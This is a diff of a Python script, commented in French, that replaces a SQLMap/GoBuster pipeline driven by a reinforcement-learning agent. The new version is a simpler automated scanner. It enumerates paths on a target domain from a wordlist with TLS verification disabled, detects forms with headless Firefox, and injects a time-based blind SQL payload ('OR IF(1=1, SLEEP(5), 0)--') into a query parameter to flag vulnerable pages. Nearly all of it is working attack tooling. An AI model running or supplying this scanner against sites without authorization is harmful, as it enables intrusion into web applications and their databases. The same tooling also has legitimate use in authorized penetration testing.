@@ -1,90 +1,146 @@
-# main.py
-import torch
-from web_env import WebEnv
-from agent import DQNAgent
-from gobuster_integration import run_gobuster
-from dataset_manager import add_urls, add_form_url, get_dataset, get_form_dataset
-from form_checker import url_has_form
-from sqlmap_multithread import run_sqlmap_multithread
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import os
+import time
+import requests
+import asyncio
+import aiohttp
+from selenium import webdriver
+from selenium.webdriver.firefox.options import Options
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+async def perform_blind_injection(url):
+    """
+    Effectue un test d'injection SQL aveugle sur l'URL donnée en ajoutant un paramètre d'injection.
+    Un payload de type time-based est utilisé pour provoquer un délai si l'injection est effective.
+    """
+    # Payload de type time-based : provoque un délai de 5 secondes si l'injection réussit.
+    injection_payload = "' OR IF(1=1, SLEEP(5), 0)-- "
+    
+    # Analyse l'URL et ajoute le paramètre 'injection'
+    parsed = urlparse(url)
+    query_params = parse_qs(parsed.query)
+    query_params["injection"] = injection_payload
+    new_query = urlencode(query_params, doseq=True)
+    injection_url = urlunparse(parsed._replace(query=new_query))
+    
+    print(f"[*] Testing blind injection on: {injection_url}")
+    
+    async with aiohttp.ClientSession() as session:
+        start_time = time.time()
+        try:
+            async with session.get(injection_url) as response:
+                await response.text()  # Nous mesurons uniquement le temps de réponse
+        except Exception as e:
+            print(f"[!] Error during injection test on {url}: {e}")
+            return
+        elapsed = time.time() - start_time
+        print(f"[+] Response time for {url}: {elapsed:.2f} seconds")
+        if elapsed > 4:
+            print(f"[!] Possible blind SQL injection vulnerability detected on {url}!")
+        else:
+            print(f"[-] No significant delay detected on {url}.")
+
+def check_url_for_form(url, headless=True):
+    """
+    Charge la page à l'URL donnée avec Firefox en mode headless et vérifie la présence d'un formulaire.
+    Renvoie True si un formulaire est détecté, sinon False.
+    """
+    firefox_options = Options()
+    if headless:
+        firefox_options.headless = True
+
+    driver = webdriver.Firefox(options=firefox_options)
+    try:
+        print(f"[*] Loading page: {url}")
+        driver.get(url)
+        # Attendre 2 secondes pour le chargement de la page
+        time.sleep(2)
+        html = driver.page_source.lower()
+        if "<form" in html:
+            print(f"[!] Form detected on {url}")
+            return True
+        else:
+            print(f"[+] No form detected on {url}")
+            return False
+    except Exception as e:
+        print(f"[!] Error with Selenium for URL {url}: {e}")
+        return False
+    finally:
+        driver.quit()
 
 def main():
-    with open("bin/temp/domain.txt", "r", encoding="utf-8") as target:
-        target_url = target.read()
+    """
+    1. Lit le domaine depuis bin/temp/domain.txt.
+    2. Lit le chemin de la wordlist depuis bin/temp/wordlist.txt.
+    3. Construit les URLs à partir de la wordlist et teste leur statut HTTP.
+    4. Pour chaque URL valide (HTTP 200), vérifie la présence d'un formulaire.
+       Si un formulaire est détecté, planifie un test d'injection SQL aveugle asynchrone.
+    5. Lance tous les tests d'injection de manière asynchrone.
+    """
+    # Lecture du domaine
+    domain_path = "bin/temp/domain.txt"
+    if not os.path.isfile(domain_path):
+        print(f"[!] Fichier introuvable: {domain_path}")
+        return
+    with open(domain_path, "r", encoding="utf-8") as f:
+        domain = f.read().strip()
 
-    with open("bin/temp/wordlist.txt", "r", encoding="utf-8") as wordlist:
-        wordlist_path = wordlist.read()
+    # Lecture du chemin de la wordlist
+    wordlist_path_file = "bin/temp/wordlist.txt"
+    if not os.path.isfile(wordlist_path_file):
+        print(f"[!] Fichier introuvable: {wordlist_path_file}")
+        return
+    with open(wordlist_path_file, "r", encoding="utf-8") as f:
+        wordlist_path = f.read().strip()
 
-    # Lancer GoBuster pour alimenter initialement le dataset complet
-    new_urls = run_gobuster(target_url, wordlist_path)
-    count = add_urls(new_urls)
-    print(f"Initialement, {count} nouvelles URLs ont été ajoutées au dataset complet.")
-    
-    # Vérifier pour chaque URL du dataset complet si un formulaire est présent
-    dataset = get_dataset()
-    for url in dataset:
-        if url_has_form(url):
-            add_form_url(url)
-    print("Dataset des URLs avec formulaire détecté:", get_form_dataset())
-    
-    # Lancement multi-threadé de SQLMap sur le dataset des URLs avec formulaire
-    form_dataset = get_form_dataset()
-    if form_dataset:
-        print("Lancement de SQLMap en multi-thread sur les URLs avec formulaire...")
-        sqlmap_results = run_sqlmap_multithread(form_dataset, max_workers=5)
-        for url, result in sqlmap_results.items():
-            print(f"{url} : {result}")
+    if not os.path.isfile(wordlist_path):
+        print(f"[!] Impossible de trouver la wordlist: {wordlist_path}")
+        return
+
+    # Lecture du contenu de la wordlist
+    try:
+        with open(wordlist_path, "r", encoding="utf-8") as f:
+            paths = [line.strip() for line in f if line.strip()]
+    except Exception as e:
+        print(f"[!] Erreur lors de la lecture de la wordlist: {e}")
+        return
+
+    print(f"[+] Domaine: {domain}")
+    print(f"[+] Wordlist: {wordlist_path}")
+    print(f"[+] Nombre de chemins à tester: {len(paths)}")
+    print("=========================================")
+
+    domain = domain.rstrip("/")
+    injection_tasks = []
+
+    # Pour chaque chemin, construire l'URL, vérifier le statut HTTP, puis détecter un formulaire
+    for path in paths:
+        if path.startswith("/"):
+            url = domain + path
+        else:
+            url = domain + "/" + path
+
+        try:
+            response = requests.get(url, timeout=5, verify=False)
+            if response.status_code == 200:
+                print(f"[+] URL valide: {url} (HTTP 200)")
+                if check_url_for_form(url, headless=True):
+                    injection_tasks.append(perform_blind_injection(url))
+            else:
+                print(f"[-] {url} => Statut {response.status_code}")
+        except requests.RequestException as req_err:
+            print(f"[!] Erreur réseau pour {url}: {req_err}")
+
+    if injection_tasks:
+        print("=========================================")
+        print("[*] Lancement des tests d'injection SQL aveugle sur les URLs avec formulaire...")
+        async def run_injections():
+            await asyncio.gather(*injection_tasks)
+        asyncio.run(run_injections())
     else:
-        print("Aucune URL avec formulaire détecté dans le dataset.")
-
-    # Exemple d'intégration avec l'agent RL (facultatif)
-    env = WebEnv(start_url=target_url)
-    state = env.reset()
-    num_actions = env.action_space.n
-    state_shape = (3, 84, 84)
-    
-    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
-    agent = DQNAgent(state_shape, num_actions, device)
-    
-    num_episodes = 10
-    max_steps = 50
-    
-    for episode in range(num_episodes):
-        state = env.reset()
-        total_reward = 0
-        for step in range(max_steps):
-            action = agent.choose_action(state)
-            next_state, reward, done, info = env.step(action)
-            agent.store_transition(state, action, reward, next_state, done)
-            agent.update()
-            state = next_state
-            print(f"Episode {episode+1}, Step {step+1}, Action {action}, Reward {reward}, Info: {info}")
-            if done:
-                break
-        print(f"Episode {episode+1} total reward: {total_reward}")
-        
-        # Après chaque épisode, mettre à jour le dataset complet via GoBuster
-        new_urls = run_gobuster(target_url, wordlist_path)
-        count = add_urls(new_urls)
-        print(f"Episode {episode+1}: {count} nouvelles URLs ajoutées au dataset complet.")
-        
-        # Vérifier les nouvelles URLs pour un formulaire et mettre à jour le dataset de formulaires
-        dataset = get_dataset()
-        for url in dataset:
-            if url_has_form(url):
-                add_form_url(url)
-        print(f"Après l'épisode {episode+1}, dataset de formulaires : {get_form_dataset()}")
-    
-    env.close()
-    
-    # Lancement final de SQLMap en multi-thread sur l'ensemble du dataset de formulaires mis à jour
-    form_dataset = get_form_dataset()
-    if form_dataset:
-        print("Lancement final de SQLMap en multi-thread sur l'ensemble du dataset de formulaires...")
-        sqlmap_results = run_sqlmap_multithread(form_dataset, max_workers=5)
-        for url, result in sqlmap_results.items():
-            print(f"{url} : {result}")
-    else:
-        print("Aucune URL avec formulaire détecté dans le dataset final.")
+        print("[+] Aucune URL avec formulaire détectée dans ce scan.")
 
 if __name__ == "__main__":
     main()
